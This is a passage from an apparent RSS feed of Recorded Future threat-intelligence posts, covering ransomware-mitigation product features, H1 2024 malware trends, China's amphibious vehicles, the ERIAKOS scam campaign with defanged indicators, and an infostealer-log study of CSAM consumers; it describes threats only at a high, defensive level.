Access Detection. Clients can prioritize and remediate the common ports and protocols targeted by ransomware actors, which are typically associated with remote access, file sharing, and service management.\n\nBased on what weve seen in our work with over 2,000 of global clients, weve developed three new advanced capabilities in our Ransomware Mitigation solution to help security teams proactively address threats. \nWhile proactive defense and resilience to ransomware attacks are achievable with the right intelligence, an AI-driven approach puts security teams ahead of their adversaries' next move, said Dr. Christopher Ahlberg, Co-founder and CEO, Recorded Future. Weve looked at the ransomware lifecycle and applied Recorded Future AI, combined with our threat intelligence and client telemetry, to create a single source of truth, defeating ransomware early for each one of our clients. \nUltimately, these new capabilities empower security teams to prepare for ransomware attacks proactively, detect them early, and act quickly post-attack to avoid harm to their finances, operations, and reputations. Heres why its never been easier for security teams to operationalize and streamline the work of ransomware detection\n#1: When Time is of the Essence, Detect Threats Faster with Our New\nRansomware Risk Profile\nWhile other solutions on the market focus on the final stages of ransomware threat detection, Recorded Future can help detect threats long before they become issues. The new Ransomware Risk Profile provides an end-to-end view of an organizations ransomware exposure across the attack lifecycle as well as guidance for each identified threat. This ensures that clients can better identify risks early, prioritize action, and take targeted mitigation steps before attackers can exploit vulnerabilities. \nKey features allow clients to:\n\nReview their riskiest assets, top ransomware-related CVEs, critical leaked identities, and top malwares and threat actors specific to the organization.\n\nTap into expert guidance for each identified threat (e.g, exploited software) with recommended actions that include patch and remediation instructions as well as threat hunting packages created by Insikt Group.\n\nDetect potential compromises before data exfiltration occurs with intelligence provided by Collective Insights.\n\nGain a clear view of ransomware-specific ports, services, vulnerabilities, and admin pages that can be leveraged by threat actors with ransomware identification and tagging in the Attack Surface Intelligence module. Quickly block entry points and exposures used by ransomware groups.\n\nIdentify ransomware threats and early-stage malware impacting the organization with Network Intelligence, which tracks malicious activity across malware families and related infrastructure globally.\n\n\n#2: Get Granular Details From Our New Victimology Table and Ransomware Actor Insights\nOur new Victimology table and updated Intelligence Cards deliver real-time visibility into ransomware victims in an organizations ecosystem, including industry, geography, and supply chain; detailed threat actor breakdowns; and secure dark web browsing to help security teams proactively defend the organization without endangering its risk posture. \nThese new insights enable teams to: \n\nSafely browse dark web ransomware extortion websites and search for files containing API secrets  all without the need to visit these potentially malicious sites.\n\nIdentify leaked data like secrets, regulated information, and IP from companies in the supply chain that have been breached. \n\nGain visibility into ransomware group operations through precise MITRE ATT&CK mappings, linking specific vulnerabilities, files, and products to each TTP for highly targeted defense planning.\n\nLeverage the latest research on top ransomware groups in updated Intelligence Cards provided by Insikt Group. For example, get details on the Rhysida hacker group and identify any relevant vulnerabilities.\n\n\n#3: Get Custom Reports with AI Reporting for Ransomware\nNow security teams can keep their leadership and organization up to date with the most relevant and timely ransomware intelligence through automated, AI-driven reporting. Recorded Future AI combines knowledge about your company with our Intelligence Graph to produce actionable, organization-specific insights.\nOur new capabilities enable clients to:\n\nAutomatically generate customized, audience-specific ransomware intelligence reports, reducing manual effort and saving time.\n\nGenerate tailored insights, with sources including telemetry from Collective Insights and the organizations IT stack from its watchlists. \n\nGet reliable results from Recorded Future AI, which is built on our Intelligence Graph and which automatically collects data across adversaries, their infrastructure, and organizations they target from proprietary sources. Results are always tagged to the original source for transparency and trust in AI.\n\n\nGet Ahead of Ransomware Attacks\nBy leveraging Recorded Futures new Threat Intelligence capabilities, clients can take a proactive stance to combating ransomware actors. As Jeremy Miller, Cyber Threat Intelligence Analyst at Nelnet, puts it: With Recorded Futures Threat Intelligence module we will be able to produce reports using AI Reporting with actionable insights on the highest priority threats to inform stakeholders across the organization.

In this case, getting information into the hands of the analysts as quickly as possible is critical. \nHow Threat Intelligence Can Help\nGain a complete view of your threat landscape to identify what matters to you\n\nQuickly identify top threat actors of interest, especially targeting your third-parties\nDetermine most concerning malware based on your companys technologies\n\n\nImplement security controls and make adjustments as necessary\n\nUnderstand the technical parameters of malware used in threat actor campaigns to close specific ports\nUpdate block lists with continuously validated IP addresses and domains for command & control (C2), botnet and remote access trojan (RAT) infrastructure\nAutomatically reset passwords in an identity access management (IAM) system with recently stolen credentials\n\n\nMitigate software threats originating from 3rd and 4th party vendors\n\nEnrich vulnerabilities on scanned third-party products with data on weaponization\nDynamic risk scoring for third-parties, updated in real-time\n\n\nDetect new threats with context\n\nReceive a notification within minutes of a potential breach impacting a key third-party, such as a database offered for sale\nDetect references to your brand and secret keywords on ransomware extortion sites to quickly understand the severity of potential leaked documents\n\n\nDecrease time to respond and report\n\nEquip users with essential information, updated in real time, on their threat landscape\nReduce time spent searching, summarizing, and writing reports by hours \nRecorded Future AI answers your questions about threat patterns, implications, and intelligence sources\n\n\n\nA Cyber-Resilient Future\nRisk management, supply chain security, and incident response are pivotal components of DORA, each playing a crucial role in strengthening an organizations cybersecurity framework. When organizations are able to integrate threat intelligence into our broader strategy, they are able to be truly proactive - understanding who may be targeting us and why, identify gaps in current programs, understand what investments need to be made, and build on strong foundations with new capabilities. Especially when it comes to directives like DORA where there may be a certain degree of flexibility in exactly how to meet requirements, organizations need to put in place processes that are flexible and scalable to meet regulation requirements of today and those that  may be seen in the future.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/NIS_2_DORA_Main_Feature_c2761817fd.jpg","length":"0","type":"image/jpg"},"content":"Learn how DORA enhances operational resilience for financial institutions in the EU, focusing on ICT risk management, third-party oversight, and more.","contentSnippet":"Learn how DORA enhances operational resilience for financial institutions in the EU, focusing on ICT risk management, third-party oversight, and more.","guid":"https://www.recordedfuture.com/blog/dora-regulation-cyber-resilience-eu","categories":["Blog"],"isoDate":"2024-09-23T00:00:00.000Z","tag":"intel"},{"title":"Bridge Detection Gaps for Superior Threat Visibility","link":"https://www.recordedfuture.com/blog/bridge-detection-gaps-superior-threat-visibility","pubDate":"Thu, 19 Sep 2024 00:00:00 GMT","content:encoded":"<p>In todays cybersecurity landscape, organizations face diverse threats, requiring sophisticated security detection tools.

Key trends include the rise of infostealer malware, which dominated the threat landscape, and a significant 103% surge in Magecart attacks targeting e-commerce platforms. Ransomware groups have also evolved, using new techniques such as passwords to validate execution and prevent analysis. The exploitation of widely used remote access software like Ivanti Secure Connect, PAN-OS, and Microsoft SmartScreen was a focal point for cybercriminals and state-sponsored actors.</p><h2 id=\"h1-2024-malware-and-vulnerability-trends-report-what-you-need-to-know\">H1 2024 Malware and Vulnerability Trends Report: What You Need to Know</h2><p>The first half of 2024 witnessed an escalation in sophisticated cyberattacks, with <a href=\"https://www.recordedfuture.com/threat-intelligence-101/threat-actors/threat-actor-types\">threat actors</a> sharpening their techniques to exploit newly disclosed vulnerabilities, evade detection, and cause greater damage. In this report, we delve into the key trends shaping the cybersecurity landscape and what organizations can do to protect themselves.</p><h2 id=\"zero-day-vulnerabilities\">Zero-day Vulnerabilities</h2><p>Zero-day vulnerabilities, particularly those affecting remote access and security solutions, became prime targets for cybercriminals and state-sponsored groups. Despite the availability of patches, attackers continued exploiting these vulnerabilities, which later became known as n-days. The ease of exploitation, combined with proof-of-concept (PoC) exploit code circulating online, made these vulnerabilities attractive to less-sophisticated hackers. The <a href=\"https://www.recordedfuture.com/vulnerability-database\">top vulnerabilities</a> exploited in H1 2024 included flaws in Ivanti Secure Connect, PAN-OS, and Microsoft Windows SmartScreen.</p><h2 id=\"infostealers-dominate-the-malware-landscape\">Infostealers Dominate the Malware Landscape</h2><p>Infostealers dominated the malware landscape as the most prevalent malware category in the first half of 2024. LummaC2, a stealthy malware designed to harvest sensitive information, became the most active, replacing other well-known <a href=\"https://www.recordedfuture.com/blog/shining-light-on-redline-stealer-malware\">infostealers like RedLine</a>. These types of malware steal personal information, such as credit card details and login credentials, which are then sold on underground forums. The financial motivation behind these attacks has driven an increase in infostealer activity, posing a severe risk to businesses and individuals alike.</p><h2 id=\"ransomware-groups-evolve-their-tactics\">Ransomware Groups Evolve Their Tactics</h2><p>Ransomware continued to be a significant threat, with groups like Fog, <a href=\"https://www.recordedfuture.com/research/ransomhub-draws-in-affiliates-with-multi-os-capability-and-high-commission-rates\">RansomHub</a>, and 3AM adopting tactics to hinder analysis and evade detection. Notably, these ransomware operators began using passwords to validate the execution of their payloads, a technique that prevents security tools from automatically analyzing the malicious code. Additionally, we saw ransomware paired with malware loaders like GuLoader and Remcos, creating attack chains that were more difficult to detect and block.</p><h2 id=\"magecart-attacks-surge\">Magecart Attacks Surge</h2><p><a href=\"https://www.recordedfuture.com/blog/magecart-attacks-the-dark-art-fraudsters-use-to-steal-payment-data\">Magecart</a>, a form of cyberattack that targets e-commerce platforms by injecting malicious code to steal customer data, saw a staggering 103% increase in H1 2024. This surge was likely attributed to vulnerabilities in widely used platforms like Adobe Commerce and the appearance of new e-skimming tools, such as &quot;Sniffer by Fleras.&quot; As online retail continues to grow, these attacks present a significant risk to businesses and their customers, highlighting the need for stronger security measures on e-commerce sites.</p><h2 id=\"how-to-protect-your-organization\">How to Protect Your Organization</h2><p>To mitigate the risks posed by these evolving threats, organizations must adopt a layered defense strategy that includes proactive monitoring, patch management, and employee education. Here are key steps to take:</p><ol><li><strong>Improve Patch Management:</strong> Ensure that vulnerabilities, especially in remote access software, are patched promptly. Automating <a href=\"https://www.recordedfuture.com/products/vulnerability-intelligence\">patch management</a> can help reduce the window of opportunity for attackers.</li><li><strong>Implement Heuristic and Behavior-Based Detection:</strong> Deploy advanced threat detection systems that can identify suspicious behaviors, such as process hollowing or the use of less-common programming languages, like Lua or NIM.</li><li><strong>Educate Employees:</strong> Social engineering remains a key entry point for malware. Continuous education on phishing tactics and malware distribution methods is critical to reducing human error.</li><li><strong>Strengthen E-commerce Security:</strong> Businesses that rely on e-commerce must prioritize security by regularly auditing third-party integrations, implementing strict content security policies (CSPs), and conducting frequent vulnerability scans.</li></ol><h2 id=\"looking-ahead-what-to-expect-for-the-rest-of-2024\">Looking Ahead: What to Expect for the Rest of 2024</h2><p>The remainder of 2024 will likely see an increase in the exploitation of newly discovered vulnerabilities in widely used enterprise software. Remote access tools and next-generation firewalls are expected to remain key targets due to their widespread use. Additionally, the trend of infostealers dominating the malware landscape will continue as demand for stolen credentials on underground markets persists. Magecart attacks are also expected to remain a serious threat, with attackers continuing to experiment with new e-skimming techniques. </p><p>To read the entire analysis, <a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2024-0910.pdf\">click here</a> to download the report as a PDF.</p>","content:encodedSnippet":"Summary:\nThe \"H1 2024 Malware and Vulnerability Trends Report\" shares how threat actors refined their tactics and exploited zero-day vulnerabilities, leaving organizations increasingly vulnerable.

The exploitation of widely used remote access software like Ivanti Secure Connect, PAN-OS, and Microsoft SmartScreen was a focal point for cybercriminals and state-sponsored actors.\nH1 2024 Malware and Vulnerability Trends Report: What You Need to Know\nThe first half of 2024 witnessed an escalation in sophisticated cyberattacks, with threat actors sharpening their techniques to exploit newly disclosed vulnerabilities, evade detection, and cause greater damage. In this report, we delve into the key trends shaping the cybersecurity landscape and what organizations can do to protect themselves.\nZero-day Vulnerabilities\nZero-day vulnerabilities, particularly those affecting remote access and security solutions, became prime targets for cybercriminals and state-sponsored groups. Despite the availability of patches, attackers continued exploiting these vulnerabilities, which later became known as n-days. The ease of exploitation, combined with proof-of-concept (PoC) exploit code circulating online, made these vulnerabilities attractive to less-sophisticated hackers. The top vulnerabilities exploited in H1 2024 included flaws in Ivanti Secure Connect, PAN-OS, and Microsoft Windows SmartScreen.\nInfostealers Dominate the Malware Landscape\nInfostealers dominated the malware landscape as the most prevalent malware category in the first half of 2024. LummaC2, a stealthy malware designed to harvest sensitive information, became the most active, replacing other well-known infostealers like RedLine. These types of malware steal personal information, such as credit card details and login credentials, which are then sold on underground forums. The financial motivation behind these attacks has driven an increase in infostealer activity, posing a severe risk to businesses and individuals alike.\nRansomware Groups Evolve Their Tactics\nRansomware continued to be a significant threat, with groups like Fog, RansomHub, and 3AM adopting tactics to hinder analysis and evade detection. Notably, these ransomware operators began using passwords to validate the execution of their payloads, a technique that prevents security tools from automatically analyzing the malicious code. Additionally, we saw ransomware paired with malware loaders like GuLoader and Remcos, creating attack chains that were more difficult to detect and block.\nMagecart Attacks Surge\nMagecart, a form of cyberattack that targets e-commerce platforms by injecting malicious code to steal customer data, saw a staggering 103% increase in H1 2024. This surge was likely attributed to vulnerabilities in widely used platforms like Adobe Commerce and the appearance of new e-skimming tools, such as \"Sniffer by Fleras.\" As online retail continues to grow, these attacks present a significant risk to businesses and their customers, highlighting the need for stronger security measures on e-commerce sites.\nHow to Protect Your Organization\nTo mitigate the risks posed by these evolving threats, organizations must adopt a layered defense strategy that includes proactive monitoring, patch management, and employee education. Here are key steps to take:\n\nImprove Patch Management: Ensure that vulnerabilities, especially in remote access software, are patched promptly. Automating patch management can help reduce the window of opportunity for attackers.\nImplement Heuristic and Behavior-Based Detection: Deploy advanced threat detection systems that can identify suspicious behaviors, such as process hollowing or the use of less-common programming languages, like Lua or NIM.\nEducate Employees: Social engineering remains a key entry point for malware. Continuous education on phishing tactics and malware distribution methods is critical to reducing human error.\nStrengthen E-commerce Security: Businesses that rely on e-commerce must prioritize security by regularly auditing third-party integrations, implementing strict content security policies (CSPs), and conducting frequent vulnerability scans.\n\nLooking Ahead: What to Expect for the Rest of 2024\nThe remainder of 2024 will likely see an increase in the exploitation of newly discovered vulnerabilities in widely used enterprise software. Remote access tools and next-generation firewalls are expected to remain key targets due to their widespread use. Additionally, the trend of infostealers dominating the malware landscape will continue as demand for stolen credentials on underground markets persists. Magecart attacks are also expected to remain a serious threat, with attackers continuing to experiment with new e-skimming techniques. \nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/Main_Feature_10_4f68d72891.jpg","length":"0","type":"image/jpg"},"content":"Discover the top cybersecurity trends of H1 2024, including the most exploited in zero-day vulnerabilities, infostealer malware dominance, and new tactics.

Following the successful development of the Type-05 family of HWS amphibious armored vehicles in the early 2000s, Chinas military and defense industry have continued to develop amphibious armored vehicles with new or improved capabilities, maintaining their focus on HWS.

The Type-05 family includes variants designed for different battlefield roles, such as assault, infantry fighting, command, reconnaissance, medical, and obstacle-clearing. Both the PLA Army (PLAA) and the PLA Navy Marine Corps (PLANMC) utilize these vehicles, though the PLAA would likely operate the majority in a large-scale operation against Taiwan.</p><h2 id=\"continuous-development-and-innovation\">Continuous Development and Innovation</h2><p>Since the Type-05s introduction, China has continued to develop new variants of existing vehicles and entirely new amphibious armored vehicles. Open-source reporting, our analysis of over 100 patents filed between 2014 and 2023, and procurement data reveal a consistent effort to increase water speeds. Engineers in China have also sought to streamline transitions between water and land, optimize maintenance, reduce corrosion, increase land mobility, and improve operational safety, among other areas of interest. In recent years, prototypes and experimental tests have reportedly achieved water speeds of 50 kilometers per hour or faster.</p><h2 id=\"operational-challenges\">Operational Challenges</h2><p>The PLA very likely views joint island landing campaigns as contests of speed, requiring rapid and continuous assaults to establish defensible beachheads. This perspective drives the PLAs prioritization of HWS amphibious armored vehicles. The development of the Type-05 required novel solutions to various technical challenges, such as designing dynamically adjustable bow and (possibly) stern flaps to generate lift and reduce water resistance.</p><p>However, the effectiveness of these vehicles in a Taiwan invasion scenario is not guaranteed. The PLANs sealift capacity, weather conditions, the sea state in the Taiwan Strait, and Taiwans geography pose significant challenges. Current estimates suggest the PLAN cannot generate enough sealift for the number of vehicles operated by the PLAAs amphibious combined arms brigades, and supplementing the PLANs fleet with PLAA landing craft and civilian merchant vessels would very likely create additional challenges.</p><h2 id=\"outlook\">Outlook</h2><p>Chinas defense industry will almost certainly continue researching and developing amphibious armored vehicles, with HWS remaining a priority. This ongoing development will very likely include incremental improvements to existing vehicles and the introduction of new variants. Despite these vehicles&#39; advanced capabilities, external factors such as limited sealift capacity and challenging geographic conditions may diminish their operational effectiveness.</p><p>China&#39;s development of amphibious armored vehicles, particularly the Type-05, demonstrates significant advancements in military technology aimed at enhancing the PLA&#39;s capabilities in potential invasion scenarios of Taiwan. For defense planners in Taiwan, the United States, and other concerned countries, it is essential to monitor Chinas advancements in amphibious armored vehicles. Understanding these developments can inform preparations and strategies to counter potential cross-strait invasion scenarios.</p><p>The author, Zoe Haver, thanks Joshua Arostegui and Jake Vartanian of the US Army War Colleges China Landpower Studies Center for their generous support. </p><p>To read the entire analysis, <a href=\"https://go.recordedfuture.com/hubfs/reports/ta-2024-0815.pdf\">click here</a> to download the report as a PDF.</p>","content:encodedSnippet":"Chinas military and defense industry have prioritized the development of amphibious armored vehicles with high water speed (HWS) capabilities in preparation for potential Taiwan invasion scenarios.

Both the PLA Army (PLAA) and the PLA Navy Marine Corps (PLANMC) utilize these vehicles, though the PLAA would likely operate the majority in a large-scale operation against Taiwan.\nContinuous Development and Innovation\nSince the Type-05s introduction, China has continued to develop new variants of existing vehicles and entirely new amphibious armored vehicles. Open-source reporting, our analysis of over 100 patents filed between 2014 and 2023, and procurement data reveal a consistent effort to increase water speeds. Engineers in China have also sought to streamline transitions between water and land, optimize maintenance, reduce corrosion, increase land mobility, and improve operational safety, among other areas of interest. In recent years, prototypes and experimental tests have reportedly achieved water speeds of 50 kilometers per hour or faster.\nOperational Challenges\nThe PLA very likely views joint island landing campaigns as contests of speed, requiring rapid and continuous assaults to establish defensible beachheads. This perspective drives the PLAs prioritization of HWS amphibious armored vehicles. The development of the Type-05 required novel solutions to various technical challenges, such as designing dynamically adjustable bow and (possibly) stern flaps to generate lift and reduce water resistance.\nHowever, the effectiveness of these vehicles in a Taiwan invasion scenario is not guaranteed. The PLANs sealift capacity, weather conditions, the sea state in the Taiwan Strait, and Taiwans geography pose significant challenges. Current estimates suggest the PLAN cannot generate enough sealift for the number of vehicles operated by the PLAAs amphibious combined arms brigades, and supplementing the PLANs fleet with PLAA landing craft and civilian merchant vessels would very likely create additional challenges.\nOutlook\nChinas defense industry will almost certainly continue researching and developing amphibious armored vehicles, with HWS remaining a priority. This ongoing development will very likely include incremental improvements to existing vehicles and the introduction of new variants. Despite these vehicles' advanced capabilities, external factors such as limited sealift capacity and challenging geographic conditions may diminish their operational effectiveness.\nChina's development of amphibious armored vehicles, particularly the Type-05, demonstrates significant advancements in military technology aimed at enhancing the PLA's capabilities in potential invasion scenarios of Taiwan. For defense planners in Taiwan, the United States, and other concerned countries, it is essential to monitor Chinas advancements in amphibious armored vehicles. Understanding these developments can inform preparations and strategies to counter potential cross-strait invasion scenarios.\nThe author, Zoe Haver, thanks Joshua Arostegui and Jake Vartanian of the US Army War Colleges China Landpower Studies Center for their generous support. \nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/ta_2024_0815_Main_Feature_5f7579cc63.jpg","length":"0","type":"image/jpg"},"content":"China’s military and defense industry have prioritized the development of amphibious armored vehicles with high water speed (HWS) capabilities in preparation for potential Taiwan invasion scenarios.","contentSnippet":"China’s military and defense industry have prioritized the development of amphibious armored vehicles with high water speed (HWS) capabilities in preparation for potential Taiwan invasion scenarios.","guid":"https://www.recordedfuture.com/research/speeding-toward-taiwan-chinas-development-amphibious-armored-vehicles","categories":["Research (Insikt)"],"isoDate":"2024-08-15T00:00:00.000Z","tag":"intel"},{"title":"Malign Influence Threats Mount Ahead of US 2024 Elections","link":"https://www.recordedfuture.com/research/malign-influence-threats-mount-ahead-us-2024-elections","pubDate":"Tue, 13 Aug 2024 00:00:00 GMT","content:encoded":"<p><img src=\"https://cms.recordedfuture.com/uploads/insikt_group_logo_updated_3_300x48_b5390f4ff2.png\" alt=\"insikt-group-logo-updated-3-300x48.png\"></p><p>Ahead of the US 2024 elections, malign influence operations by Russia, China, and Iran are ramping up, aiming to shape public opinion and disrupt the electoral process.

This campaign, detected on April 17, 2024, involves 608 fraudulent websites using brand impersonation and malvertising tactics to steal personal and financial data. Notably, the scam websites were accessible only via mobile devices and ad lures, likely to evade automated scanners. Recorded Future recommends blocklisting suspicious merchant accounts and closely monitoring customer transactions. The use of advanced screening techniques in this campaign suggests a growing trend that might challenge current detection technologies.\nERIAKOS Scam Campaign: Unveiling a Complex Web of Fraud\nOn April 17, 2024, Recorded Futures Payment Fraud Intelligence team uncovered a network of 608 scam e-commerce websites, orchestrated by a single threat actor or group, targeting Facebook users. Named the ERIAKOS campaign after the CDN used (oss[.]eriakos[.]com), these scam sites employed brand impersonation and malvertising tactics to steal victims' financial and personal data. These fraudulent sites were accessible only through mobile devices and ad lures, a tactic aimed at evading automated detection systems and our first direct observation of such a TTP.This sophisticated campaign exclusively targeted mobile users who accessed the scam sites via ad lures on Facebook. This strategic move significantly reduced the likelihood of detection by automated scanners. Merchant accounts linked to these scam websites processed payments through major card networks and Chinese PSPs, adding another layer of complexity to the fraud.\nFinancial institutions are at risk of financial fraud, including chargeback disputes and irrecoverable losses. Impersonated businesses face reputational damage, particularly among defrauded victims. To mitigate these risks, Recorded Future advises blacklisting the suspicious merchant accounts identified in the report and monitoring transactions for potential fraud indicators.\nMitigation Strategies\nTo combat this threat, financial institutions should:\n\nIdentify and blacklist merchant accounts associated with the scam domains.\nBlock customer transactions with these merchants.\nMonitor historical transaction data to detect potential exposure to these scams.\nEncourage customers to report suspicious websites and transactions.\nShare scam website leads with Recorded Future for broader threat identification.\nLeverage Recorded Future Payment Fraud intelligence (PFI) to detect and mitigate possible scam websites using the PFI common-point-of-purchase (CPP) dataset.\nLeverage Recorded Future Brand Intelligence to detect and mitigate brand impersonation threats.\n\nFor consumers, the following precautions are recommended:\n\nOnly provide personal and payment information on secure, trusted websites.\nResearch companies thoroughly before making purchases.\nVerify the legitimacy of e-commerce websites and their payment subdomains.\nBe cautious of unsolicited communications or advertisements.\nReport any scams to your card issuer and the Better Business Bureau (BBB).\n\nTechnical Analysis\nRecorded Future identified four key indicators linking the 608 domains to the ERIAKOS campaign:\n\nContent Delivery Network: All scam sites used oss[.]eriakos[.]com.\nDomain Registrar: Domains were registered with Alibaba Cloud Computing Ltd.\nIP Addresses: Two specific IP addresses (47[.]251[.]129[.]84 and 47[.]251[.]50[.]19) were consistently used.\nDomain Misconfiguration: The scam domains exhibited specific misconfigurations between their main domains and www subdomains.\n\nThese indicators, combined with merchant account data, enabled Recorded Future to map the full extent of the scam network. The use of Chinese PSPs to process payments further complicated the detection and takedown efforts.\nOutlook\nThe ERIAKOS campaigns use of advanced screening techniques to evade detection signals a potential trend in scam tactics. If these methods become more widespread, current detection technologies may struggle to identify and mitigate similar threats, leading to prolonged scam lifespans and increased victim exposure.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/Main_Feature_6_7ae9a66faa.jpg","length":"0","type":"image/jpg"},"content":"This campaign, detected on April 17, 2024, involves 608 fraudulent websites using brand impersonation and malvertising tactics to steal personal and financial data.","contentSnippet":"This campaign, detected on April 17, 2024, involves 608 fraudulent websites using brand impersonation and malvertising tactics to steal personal and financial data.","guid":"https://www.recordedfuture.com/research/eriakos-scam-campaign-detected","categories":["Research (Insikt)"],"isoDate":"2024-07-30T00:00:00.000Z","tag":"intel"},{"title":"Speed and Scale: How Threat Volume and Velocity Shape Cyber Risk Narratives for Governance Bodies","link":"https://www.recordedfuture.com/blog/speed-and-scale-how-threat-volume","pubDate":"Tue, 23 Jul 2024 00:00:00 GMT","content:encoded":"<p><em><strong>Editor&#39;s note: The following blog post originally appeared on <a href=\"https://intelligence2risk.substack.com/\">Levi Gundert&#39;s Substack page</a>.</strong></em></p><p><img src=\"https://cms.recordedfuture.com/uploads/73d9048e_aeff_4bdd_aa9c_0c1df640918e_1024x1024_334720c4a7.webp\" alt=\"73d9048e-aeff-4bdd-aa9c-0c1df640918e_1024x1024.webp\"></p><p>Developing stories that instill confidence in governance bodies (GBs) is prominent in many CISO discussions - but not all stories carry the same value.

Common distribution methods include phishing, spam campaigns, fake update websites, SEO poisoning, and malvertising. A popular infection vector is cracked software marketed to users seeking to obtain licensed software illegally. Stolen data, known as infostealer logs, often ends up on dark web sources where cybercriminals can purchase it, potentially gaining access to networks or systems.</p><p>The anonymity provided by Tor-based websites with <a href=\"https://www.recordedfuture.com/blog/dark-web-reality\">.onion domains</a> fosters the production and consumption of CSAM. Studies show that although only a small percentage of .onion websites host CSAM, the majority of dark web browsing activity targets these sites.</p><p><strong>Methodology</strong></p><p>In this proof-of-concept report, <a href=\"https://www.recordedfuture.com/products/identity-intelligence\">Recorded Future&#39;s Identity Intelligence</a> leveraged infostealer malware data to identify consumers of child sexual abuse material (CSAM), surface additional sources, and uncover geographic and behavioral trends. Our high-confidence assessments stem from the nature of the infostealer log data and subsequent research. </p><p>Sample investigations of three individuals with accounts on multiple CSAM sources suggest that having multiple CSAM accounts may indicate a higher likelihood of committing crimes against children. This study demonstrates that infostealer logs can help law enforcement track child exploitation on the dark web, a challenging area to trace.

Approximately 3,300 unique users were found with accounts on known CSAM sources. A notable 4.2% had credentials for multiple sources, suggesting a higher likelihood of criminal behavior. The study reveals how infostealer logs can aid investigators in tracking CSAM activities on the dark web. Data was escalated to law enforcement for further action.\nCaught in the Net: Using Infostealer Logs to Unmask CSAM Consumers\nBackground\nInfostealer malware steals sensitive user information such as login credentials, cryptocurrency wallets, payment card data, OS information, browser cookies, screenshots, and autofill data. Common distribution methods include phishing, spam campaigns, fake update websites, SEO poisoning, and malvertising. A popular infection vector is cracked software marketed to users seeking to obtain licensed software illegally. Stolen data, known as infostealer logs, often ends up on dark web sources where cybercriminals can purchase it, potentially gaining access to networks or systems.\nThe anonymity provided by Tor-based websites with .onion domains fosters the production and consumption of CSAM. Studies show that although only a small percentage of .onion websites host CSAM, the majority of dark web browsing activity targets these sites.\nMethodology\nIn this proof-of-concept report, Recorded Future's Identity Intelligence leveraged infostealer malware data to identify consumers of child sexual abuse material (CSAM), surface additional sources, and uncover geographic and behavioral trends. Our high-confidence assessments stem from the nature of the infostealer log data and subsequent research. \nSample investigations of three individuals with accounts on multiple CSAM sources suggest that having multiple CSAM accounts may indicate a higher likelihood of committing crimes against children. This study demonstrates that infostealer logs can help law enforcement track child exploitation on the dark web, a challenging area to trace.

It involves a multi-faceted approach that ensures the collected information is relevant, accurate, and actionable. Here are several key components:</p><ul><li><strong>Data Collection:</strong> Gathering raw data from various sources, including network logs, security incidents, and external <a href=\"https://www.recordedfuture.com/threat-intelligence-101/intelligence-sources-collection/threat-intelligence-feeds\">threat intel feeds</a>.</li><li><strong>Data Analysis:</strong> Processing and analyzing the collected data to identify patterns, trends, and indicators of potential threats.</li><li><strong>Dissemination:</strong> Sharing the analyzed intelligence with relevant stakeholders within the organization to inform security decisions and actions.</li><li><strong>Actionable Insights:</strong> Turning the analyzed data into actionable insights that can be used to mitigate risks and enhance security measures.</li></ul><h2 id=\"how-can-threat-intelligence-use-cases-help-organizations-against-cyber-threats\">How Can Threat Intelligence Use Cases Help Organizations Against Cyber Threats?</h2><p>Threat intelligence plays a pivotal role in helping organizations defend against the ever-evolving landscape of emerging cyber threats. Because threat intelligence solutions can be used in a wide variety of ways, it is important to identify your potential use cases before you choose a <a href=\"https://www.recordedfuture.com\">threat intelligence platform</a>, rather than picking a solution and then trying to conform your use cases to the strengths of that solution.</p><p>Threat intelligence use cases can streamline the incident response process. In its recent <a href=\"https://www.gartner.com/en/documents/5037731\">Market Guide</a>, the technology research company Gartner suggests that end users of cyber threat intelligence solutions identify their best solution by <strong>taking a use-case-centric approach</strong>.</p><p>For example, you may wish to gain insights into the identity, methods, and motives of threat actors targeting you so that you can avoid future threats and adjust or update your security; you may wish to create case studies for use in training exercises; or you may wish to gather more threat data so that you can <a href=\"https://www.recordedfuture.com/products/vulnerability-intelligence\">prioritize vulnerability management based on the risks</a> that your organization is particularly vulnerable to  Gartner provides a long list of possible use cases that are important to consider before choosing a solution.</p><p>Before making expensive and informed security decisions on how to improve your security operations and programs, review Gartners five examples below on the most effective uses of threat intelligence platforms.</p><br><p><img src=\"https://cms.recordedfuture.com/uploads/5_threat_intelligence_use_cases_f78bcb495e.webp\" alt=\"Threat Intelligence Use Cases\"></p><br><h3 id=\"1-enriching-other-security-technologies-by-integrating-threat-intelligence\">1. Enriching Other Security Technologies by Integrating Threat Intelligence</h3><p>These are the basics  integrating cyber threat intelligence into your already existing security processes improves decision-making for incident response and enhances your security policy. According to Gartner, cyber threat intelligence has recently begun to be widely incorporated into most security technology verticals, including security information and event management (SIEM), firewalls and unified <a href=\"https://www.recordedfuture.com/threat-intelligence-101/integrations/threat-intelligence-management\">threat management systems</a>, intrusion detection and prevention, secure web gateways and secure email gateways, endpoint protection, web application protection, distributed denial of service, vulnerability management, security orchestration, and more.</p><p>If your organization does not already include threat intelligence in its security program, a good place to start is by <strong>looking at what you are already using and seeing how threat intelligence can make it more effective</strong>. Many threat intelligence solutions offer machine-readable intelligence that can integrate frictionlessly with the security products you already use, and an increasing number of solutions are using open-source standards, making it easier than ever to share data across platforms.</p><h3 id=\"2-vulnerability-prioritization-for-security-teams\">2. Vulnerability Prioritization For Security Teams</h3><p>One of the best uses for an effective <a href=\"https://www.recordedfuture.com/blog/threat-intelligence-program\">threat intelligence program</a> is to gather data and perform analysis that will help your organization create a simple metric for evaluating vulnerabilities. This metric should be a measure of the overlap between the problems you can fix and the solutions that will make the biggest difference, given the time and resources available to you.</p><p>The traditional approach to prioritizing vulnerabilities comes from the attitude that the best security approach is to patch everything, all the time, everywhere. Achieving this goal would, in theory, lead to a perfectly impenetrable system  but it sets an impossibly high standard. So organizations that follow this approach will inevitably make compromises and go after the biggest problems first.</p><p>But, contrary to popular belief, the biggest problems (based on how much damage they actually cause) are not issues like zero-day threats or clever new exploits, but the same old vulnerabilities that continue to be exploited, precisely because so many organizations prioritize new threats within their threat hunting instead of focusing on improving their fundamentals.</p><p><a href=\"https://www.recordedfuture.com/threat-intelligence-101/threat-actors/threat-actor-types\">Threat actors</a> are just as limited  if not more so  by time and the resources available to them as you are. They naturally will tend to use the simplest, least resource-intensive 